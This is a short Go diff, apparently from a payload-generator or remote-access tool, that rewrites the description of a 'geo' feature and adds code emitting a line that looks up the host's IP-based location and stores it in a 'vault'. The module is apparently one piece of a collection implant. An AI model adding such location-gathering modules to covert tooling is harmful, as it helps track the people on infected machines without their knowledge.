@@ -8,11 +8,16 @@ import (
 func init() {
 	FeatureList = append(FeatureList, Feature{
 		Name:        "geo",
-		Description: "Advanced Geo Location payload, grabs precise geo coordinates of the connected router",
+		Description: "Basic Geo Location payload, grabs general location of the connected network",
 		ReturnsData: true,
 		Args:        []Arg{},
 		Dependencies: []string{
 			"system.lib.go",
+		},
+		GenerateCode: func(args FeatureSetArgsList) (string, error) {
+			output := "vault.StoreTable(ToTable(GetIPLocation(GetSysInfo().IP)))\n"
+
+			return output, nil
 		},
 	})
 }
